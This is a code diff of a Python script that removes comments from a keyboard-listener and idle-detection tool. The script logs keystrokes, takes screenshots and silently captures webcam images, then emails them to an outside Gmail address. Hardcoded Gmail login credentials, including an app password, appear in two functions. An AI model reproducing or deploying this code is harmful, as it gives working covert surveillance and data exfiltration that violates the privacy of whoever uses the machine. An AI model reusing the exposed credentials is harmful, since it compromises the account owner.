@@ -22,12 +22,10 @@ def show_toast(title, message, duration=5):
 
 def on_press(key):
     global idle_time
-    idle_time = 0  # Reset the idle time when a key is pressed
+    idle_time = 0  # Reset 
     try:
-        # Print the key that was pressed
         print(f'Key {key.char} pressed')
     except AttributeError:
-        # If a special key (like Shift or Enter) was pressed
         print(f'Special Key {key} pressed')
 
 def check_idle():
@@ -46,75 +44,61 @@ def check_idle():
             idle_time += 1
 
 def take_screenshot_and_camera():
-    # Capture screenshot
     screenshot = ImageGrab.grab()
-    screenshot.save('screenshot.png')  # Save the screenshot as 'screenshot.png'
+    screenshot.save('screenshot.png')  
 
-    # Capture camera image without showing the camera feed
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
     if ret:
-        cv2.imwrite('camera_image.png', frame)  # Save the camera image as 'camera_image.png'
+        cv2.imwrite('camera_image.png', frame)  
     cap.release()
 
 def send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password):
-    # Create a MIMEText object to represent the email content
+    
     email_body = MIMEMultipart()
     email_body.attach(MIMEText(message, 'plain'))
 
-    # Create the email headers
     email_body['Subject'] = subject
     email_body['From'] = from_email
     email_body['To'] = to_email
 
     try:
-        # Connect to the SMTP server
         server = smtplib.SMTP(smtp_server, smtp_port)
-        server.starttls()  # Start TLS encryption (if supported by the server)
-        server.login(smtp_username, smtp_password)  # Log in to the server
-
-        # Send the email
+        server.starttls()  
+        server.login(smtp_username, smtp_password)
         server.sendmail(from_email, to_email, email_body.as_string())
         print("Email sent successfully!")
     except Exception as e:
         print("Failed to send email. Error:", str(e))
     finally:
-        # Close the connection to the SMTP server
         server.quit()
 
 def send_email_with_screenshot():
     subject = "Suspicious Activity Detected"
     message = "Please check the attached screenshot and camera image for details."
-    from_email = "abilalcybex@gmail.com"  # Your email address
-    to_email = "i.l3br3l@gmail.com"  # Recipient's email address
+    from_email = "abilalcybex@gmail.com"
+    to_email = "i.l3br3l@gmail.com"
     smtp_server = "smtp.gmail.com"
-    smtp_port = 587  # For Gmail
-    smtp_username = "abilalcybex@gmail.com"  # Your email username
-    smtp_password = "fgfk iejq xkpa dsvw"  # Use app-specific password
-
-    # Send the email with screenshot and camera image as attachments
+    smtp_port = 587
+    smtp_username = "abilalcybex@gmail.com"
+    smtp_password = "fgfk iejq xkpa dsvw"
     send_email(subject, message, from_email, to_email, smtp_server, smtp_port, smtp_username, smtp_password)
     attach_files_to_email()
 
 def attach_files_to_email():
     subject = "Suspicious Activity Detected"
-    from_email = "abilalcybex@gmail.com"  # Your email address
-    to_email = "i.l3br3l@gmail.com"  # Recipient's email address
+    from_email = "abilalcybex@gmail.com"
+    to_email = "i.l3br3l@gmail.com"
     smtp_server = "smtp.gmail.com"
-    smtp_port = 587  # For Gmail
-    smtp_username = "abilalcybex@gmail.com"  # Your email username
-    smtp_password = "fgfk iejq xkpa dsvw"  # Use app-specific password
-
-    # Create a MIMEText object to represent the email content
+    smtp_port = 587
+    smtp_username = "abilalcybex@gmail.com"
+    smtp_password = "fgfk iejq xkpa dsvw"
     email_body = MIMEMultipart()
     email_body.attach(MIMEText("Please check the attached screenshot and camera image for details.", 'plain'))
-
-    # Create the email headers
     email_body['Subject'] = subject
     email_body['From'] = from_email
     email_body['To'] = to_email
 
-    # Attach the screenshot and camera image to the email
     for filename in ['screenshot.png', 'camera_image.png']:
         with open(filename, 'rb') as attachment:
             part = MIMEBase('application', 'octet-stream')
@@ -124,30 +108,19 @@ def attach_files_to_email():
         email_body.attach(part)
 
     try:
-        # Connect to the SMTP server
         server = smtplib.SMTP(smtp_server, smtp_port)
-        server.starttls()  # Start TLS encryption (if supported by the server)
-        server.login(smtp_username, smtp_password)  # Log in to the server
-
-        # Send the email
+        server.starttls()  
+        server.login(smtp_username, smtp_password)
         server.sendmail(from_email, to_email, email_body.as_string())
         print("Email with screenshot and camera image sent successfully!")
     except Exception as e:
         print("Failed to send email with screenshot and camera image. Error:", str(e))
     finally:
-        # Close the connection to the SMTP server
         server.quit()
 
-# Create a listener
 listener = keyboard.Listener(on_press=on_press)
-
-# Start the listener
 listener.start()
-
-# Start the idle check in a separate thread
 idle_thread = threading.Thread(target=check_idle)
 idle_thread.daemon = True
 idle_thread.start()
-
-# Keep the listener running until a key is pressed
 listener.join()
